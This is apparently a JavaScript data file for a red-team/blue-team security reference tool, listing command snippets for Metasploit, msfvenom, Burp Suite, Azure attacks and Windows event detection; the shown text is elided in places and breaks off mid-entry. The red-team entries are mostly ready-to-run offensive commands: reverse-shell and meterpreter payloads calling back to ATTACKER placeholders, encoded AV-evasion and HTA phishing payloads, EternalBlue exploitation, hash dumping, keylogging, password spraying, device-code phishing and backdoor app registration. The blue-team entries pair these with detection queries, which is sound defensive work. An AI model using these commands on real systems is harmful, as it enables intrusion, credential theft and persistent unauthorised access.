...
(function () {
  ...
  const SNIPPETS = [
    ...
    { id: 'ev-living-off-land', title: 'LOLBins (Living Off The Land)', team: 'red', category: 'evasion',
      description: 'Use legitimate OS binaries for malicious purposes — no extra tools.',
    ...
    { id: 'k8s-attack', title: 'Kubernetes Attack Techniques', team: 'red', category: 'k8s',
      description: 'K8s attacks: container escape, pod exec, mount host filesystem, deploy malicious pods.',
    ...
    { id: 'ics-assessment', title: 'ICS Security Assessment Framework', team: 'blue', category: 'ics',
      ...
      killchain: 'recon', attack: ['discovery'], pyramid: 'policies', owasp: [] },
    ...
    { id: 'stride-model', title: 'STRIDE Threat Modeling', team: 'blue', category: 'threatmodel',
      ...
      killchain: 'recon', attack: ['discovery'], pyramid: 'policies', owasp: ['A04'] },
    ...
    { id: 'threat-model-api', title: 'API Threat Modeling', team: 'blue', category: 'threatmodel',
      ...
      killchain: 'weaponization', attack: ['initial-access'], pyramid: 'policies', owasp: ['A01', 'A07'] },
    { id: 'threat-model-cloud', title: 'Cloud Threat Modeling', team: 'blue', category: 'threatmodel',
      ...
      killchain: 'recon', attack: ['discovery', 'privilege-escalation'], pyramid: 'policies', owasp: ['A01', 'A05'] },
    ...
    { id: 'playbook-ransomware', title: 'Ransomware Incident Playbook', team: 'blue', category: 'playbooks',
      ...
      killchain: 'actions', attack: ['impact'], pyramid: 'policies', owasp: [] },
    ...
    { id: 'playbook-insider', title: 'Insider Threat Playbook', team: 'blue', category: 'playbooks',
      ...
      killchain: 'actions', attack: ['exfiltration', 'collection'], pyramid: 'policies', owasp: [] },
    ...
    { id: 'playbook-data-breach', title: 'Data Breach Response Playbook', team: 'blue', category: 'playbooks',
      ...
      killchain: 'actions', attack: ['exfiltration', 'impact'], pyramid: 'policies', owasp: ['A01'] },

    // ── Round 12: Notion-sourced categories ─────────────────────

    // ── Metasploit ──
    { id: 'msf-basics', title: 'Metasploit Console Basics', team: 'red', category: 'metasploit',
      description: 'Core msfconsole workflow: search, use, set options, and run exploits. Module types: exploit, auxiliary, post, payload, encoder, nop.',
      tags: ['metasploit', 'msfconsole', 'exploit', 'framework'],
      command: '# ── METASPLOIT CONSOLE BASICS ──\n\n# Start msfconsole\nmsfconsole -q\n\n# Search for modules\nmsf6> search type:exploit platform:windows smb\nmsf6> search cve:2021-34527   # PrintNightmare\nmsf6> search name:eternalblue\n\n# Use a module\nmsf6> use exploit/windows/smb/ms17_010_eternalblue\nmsf6> info\nmsf6> show options\n\n# Set required options\nmsf6> set RHOSTS TARGET_IP\nmsf6> set LHOST ATTACKER_IP\nmsf6> set LPORT 4444\n\n# Set payload\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\n\n# Run exploit\nmsf6> exploit\n# or run in background\nmsf6> exploit -j\n\n# Session management\nmsf6> sessions -l          # List sessions\nmsf6> sessions -i 1        # Interact with session 1\nmsf6> sessions -K          # Kill all sessions\n\n# Database commands (requires postgresql)\nmsf6> db_status\nmsf6> workspace -a pentest1\nmsf6> hosts\nmsf6> services\nmsf6> vulns\nmsf6> db_nmap -sV -O TARGET',
      killchain: 'exploitation', attack: ['execution'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'msf-payloads', title: 'MSFvenom Payload Generation', team: 'red', category: 'metasploit',
      description: 'Generate payloads with msfvenom for various platforms: Windows, Linux, web shells, and encoded payloads.',
      tags: ['msfvenom', 'metasploit', 'payload', 'shellcode'],
      commands: {
        linux: '# ── MSFVENOM PAYLOADS (Linux targets) ──\n\n# Linux reverse shell (ELF)\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o revshell\nchmod +x revshell\n\n# Linux meterpreter\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f elf -o meterpreter\n\n# Python reverse shell\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -o shell.py\n\n# Web payloads\nmsfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f raw -o shell.php\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f war -o shell.war\n\n# List all payloads/encoders\nmsfvenom -l payloads | grep linux\nmsfvenom -l encoders\nmsfvenom -l formats',
        windows: '# ── MSFVENOM PAYLOADS (Windows targets) ──\n\n# Windows reverse shell (EXE)\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o revshell.exe\n\n# Windows meterpreter (staged)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# Stageless meterpreter (more stable, larger file)\nmsfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o meter_stageless.exe\n\n# DLL injection payload\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o payload.dll\n\n# PowerShell one-liner\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f psh-cmd -o payload.ps1\n\n# Encoded payload (AV evasion — basic)\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o encoded.exe\n\n# HTA payload for phishing\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f hta-psh -o payload.hta',
        macos: '# ── MSFVENOM PAYLOADS (macOS targets) ──\n\n# macOS reverse shell (Mach-O)\nmsfvenom -p osx/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f macho -o revshell\nchmod +x revshell\n\n# macOS meterpreter\nmsfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -f macho -o meter\n\n# Python payload (cross-platform)\nmsfvenom -p python/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=4444 -o shell.py'
      },
      killchain: 'weaponization', attack: ['execution', 'defense-evasion'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'msf-handler', title: 'Metasploit Multi/Handler', team: 'red', category: 'metasploit',
      description: 'Set up exploit/multi/handler to catch reverse shells and meterpreter callbacks. Essential for receiving payloads.',
      tags: ['metasploit', 'handler', 'meterpreter', 'listener'],
      command: '# ── METASPLOIT MULTI/HANDLER ──\n\nmsfconsole -q\n\n# Basic handler setup\nmsf6> use exploit/multi/handler\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf6> set LHOST 0.0.0.0\nmsf6> set LPORT 4444\nmsf6> set ExitOnSession false   # Keep listening after first session\nmsf6> exploit -j                # Run as background job\n\n# For staged payloads:\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_tcp\n# For stageless:\nmsf6> set PAYLOAD windows/x64/meterpreter_reverse_tcp\n\n# HTTP/HTTPS handler (firewall bypass)\nmsf6> set PAYLOAD windows/x64/meterpreter/reverse_https\nmsf6> set LHOST 0.0.0.0\nmsf6> set LPORT 443\nmsf6> set HandlerSSLCert /path/to/cert.pem\nmsf6> exploit -j\n\n# Jobs management\nmsf6> jobs -l        # List active jobs\nmsf6> jobs -k 0      # Kill job 0\n\n# Meterpreter post-exploitation\nmeterpreter> sysinfo\nmeterpreter> getuid\nmeterpreter> getsystem          # Try privesc\nmeterpreter> hashdump           # Dump hashes\nmeterpreter> load kiwi          # Mimikatz\nmeterpreter> creds_all\nmeterpreter> upload /tmp/tool.exe C:\\\\temp\\\\tool.exe\nmeterpreter> download C:\\\\Users\\\\admin\\\\Desktop\\\\secrets.txt\nmeterpreter> screenshot\nmeterpreter> keyscan_start\nmeterpreter> shell              # Drop to OS shell\nmeterpreter> background         # Background session',
      killchain: 'exploitation', attack: ['execution', 'command-and-control'], pyramid: 'tools', owasp: ['A06'] },
    { id: 'msf-scanning', title: 'Metasploit Auxiliary Scanners', team: 'red', category: 'metasploit',
      description: 'Use auxiliary modules for scanning, enumeration, and service identification without exploitation.',
      tags: ['metasploit', 'auxiliary', 'scanner', 'enumeration'],
      command: '# ── METASPLOIT AUXILIARY SCANNERS ──\n\n# Port scanning\nmsf6> use auxiliary/scanner/portscan/tcp\nmsf6> set RHOSTS 192.168.1.0/24\nmsf6> set PORTS 21,22,25,80,135,139,443,445,3306,3389,5432,8080\nmsf6> set THREADS 50\nmsf6> run\n\n# SMB enumeration\nmsf6> use auxiliary/scanner/smb/smb_version\nmsf6> set RHOSTS TARGET\nmsf6> run\n\nmsf6> use auxiliary/scanner/smb/smb_enumshares\nmsf6> set RHOSTS TARGET\nmsf6> run\n\n# SSH version scan\nmsf6> use auxiliary/scanner/ssh/ssh_version\nmsf6> set RHOSTS RANGE\nmsf6> run\n\n# HTTP directory scanner\nmsf6> use auxiliary/scanner/http/dir_scanner\nmsf6> set RHOSTS TARGET\nmsf6> run\n\n# FTP anonymous login check\nmsf6> use auxiliary/scanner/ftp/anonymous\nmsf6> set RHOSTS RANGE\nmsf6> run\n\n# SNMP community strings\nmsf6> use auxiliary/scanner/snmp/snmp_login\nmsf6> set RHOSTS RANGE\nmsf6> run\n\n# Vulnerability check (without exploit)\nmsf6> use auxiliary/scanner/smb/smb_ms17_010\nmsf6> set RHOSTS RANGE\nmsf6> run',
      killchain: 'reconnaissance', attack: ['discovery', 'reconnaissance'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'msf-post', title: 'Metasploit Post-Exploitation Modules', team: 'red', category: 'metasploit',
      description: 'Post-exploitation modules for credential harvesting, persistence, pivoting, and evidence collection.',
      tags: ['metasploit', 'post-exploit', 'meterpreter', 'persistence'],
      command: '# ── METASPLOIT POST-EXPLOITATION ──\n\n# Credential gathering\nmeterpreter> run post/windows/gather/hashdump\nmeterpreter> run post/windows/gather/smart_hashdump\nmeterpreter> run post/multi/gather/ssh_creds\nmeterpreter> run post/windows/gather/credentials/credential_collector\n\n# System enumeration\nmeterpreter> run post/windows/gather/enum_logged_on_users\nmeterpreter> run post/windows/gather/enum_applications\nmeterpreter> run post/windows/gather/enum_shares\nmeterpreter> run post/windows/gather/checkvm\n\n# Network pivoting\nmeterpreter> run autoroute -s 10.10.10.0/24   # Add route through session\nmeterpreter> run autoroute -p                  # Print routes\nmsf6> use auxiliary/server/socks_proxy\nmsf6> set SRVPORT 1080\nmsf6> run -j\n# Then: proxychains nmap -sT 10.10.10.0/24\n\n# Persistence\nmeterpreter> run persistence -U -i 5 -p 4444 -r ATTACKER_IP\nmsf6> use exploit/windows/local/persistence_service\n\n# Port forwarding\nmeterpreter> portfwd add -l 3389 -p 3389 -r INTERNAL_TARGET\nmeterpreter> portfwd list\n\n# Privilege escalation suggestions\nmsf6> use post/multi/recon/local_exploit_suggester\nmsf6> set SESSION 1\nmsf6> run',
      killchain: 'actions', attack: ['credential-access', 'persistence', 'lateral-movement'], pyramid: 'tools', owasp: ['A04'] },

    // ── Burp Suite ──
    { id: 'burp-proxy', title: 'Burp Suite Proxy Setup', team: 'red', category: 'burp',
      description: 'Configure Burp Suite proxy for intercepting HTTP/HTTPS traffic. Browser proxy setup, CA certificate installation, and scope configuration.',
      tags: ['burpsuite', 'proxy', 'intercept', 'http'],
      command: '# ── BURP SUITE PROXY SETUP ──\n\n# Default proxy: 127.0.0.1:8080\n# Browser: Set HTTP/HTTPS proxy to 127.0.0.1:8080\n# Firefox: Settings > Network > Manual Proxy > 127.0.0.1:8080\n\n# Install Burp CA certificate (for HTTPS interception):\n# 1. Browse to http://burpsuite (with proxy active)\n# 2. Click "CA Certificate" to download\n# 3. Firefox: Settings > Certificates > Import > Select der file\n# 4. Chrome: Settings > Security > Manage Certificates > Import\n\n# Scope configuration:\n# Target > Scope > Add:\n#   Protocol: Any\n#   Host: ^(.*\\.)?target\\.com$\n#   Port: ^443$\n#   File: ^/api/.*\n\n# Proxy settings:\n# Proxy > Options:\n#   - Intercept Client Requests: URL matches target scope\n#   - Response modification: Unhide hidden form fields\n#   - Match & Replace: Add custom headers\n\n# Key shortcuts:\n# Ctrl+I       — Send to Intruder\n# Ctrl+R       — Send to Repeater\n# Ctrl+F       — Forward intercepted request\n# Ctrl+D       — Drop intercepted request\n# Ctrl+T       — Toggle intercept on/off\n\n# HTTP methods reference:\n# GET     — Retrieve resource\n# POST    — Submit data\n# PUT     — Update/replace resource\n# PATCH   — Partial update\n# DELETE  — Remove resource\n# OPTIONS — Check allowed methods (CORS preflight)\n# HEAD    — GET without body (check headers)',
      killchain: 'reconnaissance', attack: ['reconnaissance', 'collection'], pyramid: 'tools', owasp: ['A05'] },
    { id: 'burp-intruder', title: 'Burp Intruder Attack Types', team: 'red', category: 'burp',
      description: 'Burp Intruder for automated fuzzing, brute-forcing, and parameter manipulation. Four attack types with payload configurations.',
      tags: ['burpsuite', 'intruder', 'fuzzing', 'bruteforce'],
      command: '# ── BURP INTRUDER ATTACK TYPES ──\n\n# SNIPER: Single payload set, one position at a time\n# Use: Testing each parameter individually\n# Positions: username=[PAYLOAD]test[PAYLOAD]&password=[PAYLOAD]test[PAYLOAD]\n# Payload: [admin, root, user]\n# Requests: admin/test, root/test, user/test, test/admin, test/root, test/user\n\n# BATTERING RAM: Single payload set, all positions simultaneously\n# Use: Same value in multiple places\n# Positions: username=[PAYLOAD]test[PAYLOAD]&password=[PAYLOAD]test[PAYLOAD]\n# Payload: [admin, root]\n# Requests: admin/admin, root/root\n\n# PITCHFORK: Multiple payload sets, one per position (parallel)\n# Use: Known username:password pairs\n# Positions: username=[PAYLOAD]test[PAYLOAD]&password=[PAYLOAD]test[PAYLOAD]\n# Set 1: [admin, user]  Set 2: [Password1, Welcome1]\n# Requests: admin/Password1, user/Welcome1\n\n# CLUSTER BOMB: Multiple sets, all combinations (cartesian product)\n# Use: Brute force all username/password combos\n# Positions: username=[PAYLOAD]test[PAYLOAD]&password=[PAYLOAD]test[PAYLOAD]\n# Set 1: [admin, user]  Set 2: [pass1, pass2, pass3]\n# Requests: admin/pass1, admin/pass2, admin/pass3, user/pass1, user/pass2, user/pass3\n\n# Payload types:\n# - Simple list (wordlists)\n# - Runtime file (/usr/share/wordlists/)\n# - Numbers (range with step)\n# - Dates\n# - Brute forcer (charset + length)\n# - Null payloads (for rate testing)\n\n# Grep-Match: Flag responses containing specific strings\n# Grep-Extract: Extract data from responses\n# Resource pool: Throttle requests (avoid lockout)',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'tools', owasp: ['A07'] },
    { id: 'burp-repeater', title: 'Burp Repeater & Scanner', team: 'red', category: 'burp',
      description: 'Manual request manipulation with Repeater and automated vulnerability scanning. Includes common injection test patterns.',
      tags: ['burpsuite', 'repeater', 'scanner', 'injection'],
      command: '# ── BURP REPEATER & SCANNER ──\n\n# REPEATER: Manual request manipulation\n# Send request from Proxy/Target with Ctrl+R\n# Modify and resend to test:\n\n# SQL Injection tests:\n# Original: id=1\n# Tests:    id=1\'          — Error-based\n#           id=1 OR 1=1     — Boolean\n#           id=1; WAITFOR DELAY \'0:0:5\'  — Time-based\n#           id=1 UNION SELECT null,null,null -- — Union\n\n# XSS tests:\n# <script>alert(1)</script>\n# <img src=x onerror=alert(1)>\n# javascript:alert(1)\n# "><svg onload=alert(1)>\n\n# SSRF tests:\n# url=http://127.0.0.1\n# url=http://169.254.169.254/latest/meta-data/\n# url=http://[::1]\n\n# Path traversal:\n# file=../../../etc/passwd\n# file=....//....//....//etc/passwd\n# file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\n\n# SCANNER (Pro only):\n# Target > right-click > Scan\n# Scan types:\n#   - Passive: Analyze existing traffic (no new requests)\n#   - Active: Send test payloads (invasive)\n# Scan config: Audit checks, insertion points, speed\n# Results: Dashboard > Issue activity\n\n# Comparer: Compare two responses\n# Decoder: Encode/decode (URL, Base64, HTML, Hex)\n# Sequencer: Analyze token randomness (session cookies)',
      killchain: 'exploitation', attack: ['initial-access', 'execution'], pyramid: 'tools', owasp: ['A03'] },
    { id: 'burp-extensions', title: 'Burp Suite Extensions', team: 'red', category: 'burp',
      description: 'Essential Burp extensions for authorization testing, JWT attacks, parameter discovery, and active scanning enhancement.',
      tags: ['burpsuite', 'extensions', 'autorize', 'jwt', 'param-miner'],
      command: '# ── ESSENTIAL BURP EXTENSIONS ──\n\n# Install via: Extender > BApp Store\n\n# AUTORIZE — Authorization testing\n# 1. Install from BApp Store\n# 2. Capture low-priv user cookie/token\n# 3. Paste into Autorize config\n# 4. Browse as high-priv user\n# 5. Autorize replays each request with low-priv token\n# Color coding:\n#   Red = Bypassed (IDOR/broken access control)\n#   Orange = Possibly bypassed\n#   Green = Properly enforced\n\n# JWT EDITOR — JWT manipulation\n# 1. Install from BApp Store\n# 2. Proxy captures JWT tokens automatically\n# 3. JWT tab appears in Repeater\n# 4. Attacks:\n#   - Algorithm confusion (RS256 > HS256)\n#   - None algorithm\n#   - Key injection (jwk/jku header)\n#   - Signature stripping\n#   - Embedded JWK\n\n# PARAM MINER — Hidden parameter discovery\n# 1. Install from BApp Store\n# 2. Right-click request > Extensions > Param Miner > Guess params\n# 3. Finds: hidden GET/POST params, headers, cookies\n# 4. Detects: cache poisoning, parameter pollution\n\n# OTHER ESSENTIALS:\n# - Logger++ (enhanced logging with filters)\n# - Active Scan++ (additional scan checks)\n# - Turbo Intruder (Python-scripted fast fuzzing)\n# - Hackvertor (tag-based encoding/conversion)\n# - InQL (GraphQL introspection & fuzzing)\n# - Upload Scanner (test file upload vulnerabilities)',
      killchain: 'exploitation', attack: ['privilege-escalation', 'initial-access'], pyramid: 'tools', owasp: ['A01'] },

    // ── Azure Attacks ──
    { id: 'azure-recon', title: 'Azure & Entra ID Reconnaissance', team: 'red', category: 'azure',
      description: 'Enumerate Azure tenants, subdomains, storage blobs, and Entra ID (Azure AD) information from external perspective.',
      tags: ['azure', 'entra-id', 'cloud', 'reconnaissance', 'tenant'],
      command: '# ── AZURE RECONNAISSANCE ──\n\n# Tenant enumeration\ncurl -s "https://login.microsoftonline.com/TARGET.onmicrosoft.com/.well-known/openid-configuration" | jq .\ncurl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&json=1" | jq .\n\n# Subdomain enumeration\n# Common Azure subdomains to check:\n# target.blob.core.windows.net      (Storage)\n# target.file.core.windows.net      (File shares)\n# target.table.core.windows.net     (Table storage)\n# target.queue.core.windows.net     (Queue)\n# target.azurewebsites.net          (App Service)\n# target.database.windows.net       (SQL)\n# target.vault.azure.net            (Key Vault)\n# target.azurecr.io                 (Container Registry)\n# target.servicebus.windows.net     (Service Bus)\n\n# Check for open blob containers\ncurl -s "https://TARGET.blob.core.windows.net/CONTAINER?restype=container&comp=list"\n\n# Certificate transparency search\n# https://crt.sh/?q=%.target.com\ncurl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r \'.[].name_value\' | sort -u\n\n# Azure IP ranges\n# https://www.microsoft.com/en-us/download/details.aspx?id=56519\n\n# Git secrets scanning in repos\n# Look for: .publishsettings, .azure/, ServicePrincipal, AZURE_CLIENT_SECRET\ntrufflehog git https://github.com/target/repo --only-verified\ngitleaks detect --source /path/to/repo',
      killchain: 'reconnaissance', attack: ['reconnaissance', 'discovery'], pyramid: 'network-infra', owasp: ['A05'] },
    { id: 'azure-auth-attack', title: 'Azure Authentication Attacks', team: 'red', category: 'azure',
      description: 'Password spraying, MFA bypass, token theft, and OAuth abuse against Azure/Entra ID.',
      tags: ['azure', 'entra-id', 'password-spray', 'mfa-bypass', 'oauth'],
      command: '# ── AZURE AUTHENTICATION ATTACKS ──\n\n# Password spraying with MSOLSpray\nImport-Module .\\MSOLSpray.ps1\nInvoke-MSOLSpray -UserList .\\users.txt -Password "Spring2024!" -URL "https://login.microsoftonline.com"\n\n# Check for accounts without MFA\n# Use roadtx for token manipulation\npip install roadtools\nroadtx auth -u user@target.com -p "password" --client 1b730954-1685-4b74-9bfd-dac224a7b894\nroadtx describe < .roadtools_auth\n\n# OAuth phishing — device code flow\n# 1. Attacker gets device code:\nroadtx codeauth --client 1b730954-1685-4b74-9bfd-dac224a7b894\n# 2. Send link + code to victim: https://microsoft.com/devicelogin\n# 3. Victim enters code, attacker gets tokens\n\n# Token from stolen cookie / browser\n# Extract from: Chrome > DevTools > Application > Cookies > login.microsoftonline.com\n# Look for: ESTSAUTH, ESTSAUTHPERSISTENT\n\n# Enumerate with stolen token\nroadtx interactiveauth --estscookie "COOKIE_VALUE"\n\n# AADInternals (comprehensive Azure toolkit)\nInstall-Module AADInternals\nImport-Module AADInternals\nGet-AADIntLoginInformation -UserName "user@target.com"\nGet-AADIntTenantDetails\n\n# PRT (Primary Refresh Token) extraction\n# Requires SYSTEM on Azure AD joined device\nmimikatz # token::elevate\nmimikatz # dpapi::cloudapkd /keyvalue:KEY /unprotect',
      killchain: 'exploitation', attack: ['credential-access', 'initial-access'], pyramid: 'credentials', owasp: ['A07'] },
    { id: 'azure-post-exploit', title: 'Azure Post-Exploitation', team: 'red', category: 'azure',
      description: 'Privilege escalation, persistence, and data exfiltration in Azure environments using AzureHound, ROADtools, and PowerZure.',
      tags: ['azure', 'azurehound', 'roadtools', 'privesc', 'persistence'],
      command: '# ── AZURE POST-EXPLOITATION ──\n\n# AzureHound — BloodHound for Azure\n# Collect Azure AD data for attack path analysis\n.\\azurehound.exe -r "target.onmicrosoft.com" list --tenant "TENANT_ID" -j\n# Import into BloodHound, look for:\n# - Paths to Global Admin\n# - Service Principals with excessive permissions\n# - Managed Identity abuse paths\n\n# ROADtools — Azure AD exploration\npip install roadtools\nroadrecon auth -u user@target.com -p password\nroadrecon gather --mfa   # Collect all Azure AD data\nroadrecon gui            # Web interface at localhost:5000\n# Explore: Users, Groups, Apps, Service Principals, Roles\n\n# PowerZure — Azure exploitation\nImport-Module .\\PowerZure.psm1\n# Situational awareness\nGet-AzureTargets\nShow-AzureCurrentUser\nGet-AzureRoleAssignment\n\n# Privilege escalation\n# Check for: Contributor on subscription, Owner on resource group\n# VM Command Execution (if Contributor):\naz vm run-command invoke -g RESOURCE_GROUP -n VM_NAME --command-id RunPowerShellScript --scripts "whoami"\n\n# Persistence\n# Add credentials to service principal\naz ad sp credential reset --id SP_ID --append\n\n# Create backdoor app registration\naz ad app create --display-name "Audit Service" --sign-in-audience AzureADMyOrg\naz ad app credential reset --id APP_ID\n\n# Key Vault access (if permitted)\naz keyvault list\naz keyvault secret list --vault-name VAULT\naz keyvault secret show --vault-name VAULT --name SECRET',
      killchain: 'actions', attack: ['privilege-escalation', 'persistence', 'collection'], pyramid: 'tools', owasp: ['A01'] },
    { id: 'azure-defense', title: 'Azure Security Monitoring', team: 'blue', category: 'azure',
      description: 'Detect and defend against Azure attacks: Sentinel queries, Conditional Access, and security hardening.',
      tags: ['azure', 'sentinel', 'defense', 'monitoring', 'conditional-access'],
      command: '# ── AZURE DEFENSE & MONITORING ──\n\n# Sentinel KQL — Detect password spraying\nSigninLogs\n| where TimeGenerated > ago(1h)\n| where ResultType == "50126"   // Invalid username or password\n| summarize FailedAttempts=count(), TargetAccounts=dcount(UserPrincipalName)\n    by IPAddress, bin(TimeGenerated, 5m)\n| where FailedAttempts > 10 and TargetAccounts > 5\n\n# Detect suspicious OAuth consent grants\nAuditLogs\n| where OperationName == "Consent to application"\n| extend AppName = tostring(TargetResources[0].displayName)\n| extend ConsentedBy = tostring(InitiatedBy.user.userPrincipalName)\n| project TimeGenerated, AppName, ConsentedBy, CorrelationId\n\n# Detect impossible travel\nSigninLogs\n| where ResultType == 0\n| project TimeGenerated, UserPrincipalName, Location, IPAddress\n| serialize\n| extend PrevLocation = prev(Location), PrevTime = prev(TimeGenerated)\n| where UserPrincipalName == prev(UserPrincipalName)\n| extend TimeDiff = datetime_diff("minute", TimeGenerated, PrevTime)\n| where Location != PrevLocation and TimeDiff < 60\n\n# Conditional Access best practices:\n# 1. Require MFA for all users (start with report-only mode)\n# 2. Block legacy authentication protocols\n# 3. Require compliant devices for sensitive apps\n# 4. Named locations for trusted networks\n# 5. Session controls: sign-in frequency, persistent browser\n\n# Monkey365 — Azure security audit\nImport-Module monkey365\nInvoke-Monkey365 -ExportTo HTML -Instance Azure -Analysis All',
      killchain: 'defense', attack: ['defense-evasion', 'credential-access'], pyramid: 'policies', owasp: ['A01'] },

    // ── Windows Event Analysis ──
    { id: 'winevents-security', title: 'Windows Security Event IDs', team: 'blue', category: 'winevents',
      description: 'Critical Windows Security event IDs for logon monitoring, account changes, and privilege escalation detection.',
      tags: ['windows-events', 'security-log', 'event-ids', 'detection'],
      command: '# ── CRITICAL WINDOWS SECURITY EVENT IDs ──\n\n# LOGON EVENTS\n# 4624  — Successful logon\n#   Type 2: Interactive (console)\n#   Type 3: Network (SMB, mapped drives)\n#   Type 4: Batch (scheduled tasks)\n#   Type 5: Service\n#   Type 7: Unlock\n#   Type 10: RemoteInteractive (RDP)\n#   Type 11: CachedInteractive\n# 4625  — Failed logon (brute force indicator)\n# 4634  — Logoff\n# 4648  — Logon with explicit credentials (runas, PsExec)\n# 4672  — Special privileges assigned (admin logon)\n\n# ACCOUNT MANAGEMENT\n# 4720  — User account created\n# 4722  — User account enabled\n# 4724  — Password reset attempt\n# 4725  — User account disabled\n# 4726  — User account deleted\n# 4728  — Member added to security-enabled global group\n# 4732  — Member added to security-enabled local group\n# 4735  — Security-enabled local group changed\n# 4740  — User account locked out\n# 4756  — Member added to universal security group\n\n# PROCESS & POLICY\n# 4688  — Process created (enable command line logging!)\n# 4689  — Process exited\n# 4697  — Service installed\n# 4698  — Scheduled task created\n# 4699  — Scheduled task deleted\n# 4702  — Scheduled task updated\n# 4719  — System audit policy changed\n# 4946  — Windows Firewall rule added\n\n# OBJECT ACCESS\n# 4656  — Handle requested to object\n# 4663  — Attempt to access object\n# 4670  — Permissions on object changed\n# 5140  — Network share accessed\n# 5145  — Shared object access checked (detailed)',
      killchain: 'defense', attack: ['credential-access', 'persistence', 'defense-evasion'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-sysmon', title: 'Sysmon Event IDs & Configuration', team: 'blue', category: 'winevents',
      description: 'Sysmon event IDs for advanced endpoint monitoring: process creation, network connections, file/registry changes, and WMI events.',
      tags: ['sysmon', 'windows-events', 'endpoint-detection', 'monitoring'],
      command: '# ── SYSMON EVENT IDs ──\n\n# PROCESS\n# 1   — Process Create (includes command line, parent process, hashes)\n# 2   — Process changed file creation time (timestomping)\n# 5   — Process Terminate\n# 6   — Driver Loaded (detect rootkits)\n# 7   — Image Loaded (DLL loading — can be noisy)\n\n# NETWORK\n# 3   — Network Connection (source/dest IP, port, process)\n#       Filter: exclude known good (browsers, updates)\n# 22  — DNS Query (domain + query result)\n#       Key for: C2 detection, DGA domains\n\n# FILE\n# 11  — File Create\n# 15  — FileCreateStreamHash (ADS — Alternate Data Streams)\n# 23  — File Delete (archived)\n# 26  — File Delete Logged\n\n# REGISTRY\n# 12  — Registry object added/deleted\n# 13  — Registry value set\n# 14  — Registry key/value renamed\n#       Monitor: Run/RunOnce, Services, Winlogon\n\n# WMI\n# 19  — WmiEventFilter activity\n# 20  — WmiEventConsumer activity\n# 21  — WmiEventConsumerToFilter activity\n\n# OTHER\n# 8   — CreateRemoteThread (injection detection)\n# 10  — ProcessAccess (credential dumping — lsass.exe access)\n# 17  — PipeCreated (named pipes — C2 indicator)\n# 18  — PipeConnected\n# 25  — ProcessTampering (process image change)\n\n# SYSMON INSTALL & CONFIG\n# sysmon64.exe -accepteula -i sysmonconfig.xml\n# Recommended configs:\n# - SwiftOnSecurity: github.com/SwiftOnSecurity/sysmon-config\n# - Olaf Hartong:    github.com/olafhartong/sysmon-modular\n# Update config:\n# sysmon64.exe -c sysmonconfig-updated.xml',
      killchain: 'defense', attack: ['execution', 'persistence', 'defense-evasion', 'credential-access'], pyramid: 'artifacts', owasp: ['A09'] },
    { id: 'winevents-splunk', title: 'Splunk SPL for Windows Events', team: 'blue', category: 'winevents',
      description: 'Splunk Search Processing Language (SPL) queries for detecting attacks via Windows event logs.',
      tags: ['splunk', 'spl', 'siem', 'windows-events', 'detection'],
      command: '# ── SPLUNK SPL QUERIES FOR WINDOWS EVENTS ──\n\n# Failed logon brute force\nindex=wineventlog sourcetype=WinEventLog:Security EventCode=4625\n| stats count by src_ip, Account_Name\n| where count > 10\n| sort -count\n\n# Successful logon after failures (credential stuffing)\nindex=wineventlog sourcetype=WinEventLog:Security EventCode IN (4625, 4624)\n| transaction Account_Name maxspan=1h\n| where eventcount > 5 AND EventCode=4624\n| table _time, Account_Name, src_ip, Logon_Type\n\n# New user creation (persistence)\nindex=wineventlog sourcetype=WinEventLog:Security EventCode=4720\n| table _time, TargetUserName, SubjectUserName, SubjectDomainName\n\n# Service installation (persistence / lateral movement)\nindex=wineventlog sourcetype=WinEventLog:System EventCode=7045\n| table _time, Service_Name, Service_File_Name, Service_Type, Service_Start_Type\n| search Service_File_Name="*cmd*" OR Service_File_Name="*powershell*" OR Service_File_Name="*temp*"\n\n# PowerShell suspicious commands\nindex=wineventlog sourcetype=WinEventLog:Microsoft-Windows-PowerShell/Operational EventCode=4104\n| search ScriptBlockText="*Invoke-Mimikatz*" OR ScriptBlockText="*Net.WebClient*"\n    OR ScriptBlockText="*-enc*" OR ScriptBlockText="*IEX*" OR ScriptBlockText="*bypass*"\n| table _time, ComputerName, ScriptBlockText\n\n# Sysmon process creation with suspicious parents\nindex=sysmon EventCode=1\n| search ParentImage="*\\\\winword.exe" OR ParentImage="*\\\\excel.exe"\n    OR ParentImage="*\\\\outlook.exe"\n| where Image!="*\\\\splunkd.exe"\n| table _time, Computer, User, ParentImage, Image, CommandLine\n\n# Lateral movement via PsExec\nindex=sysmon EventCode=1 Image="*\\\\psexe*"\n| append [search index=sysmon EventCode=17 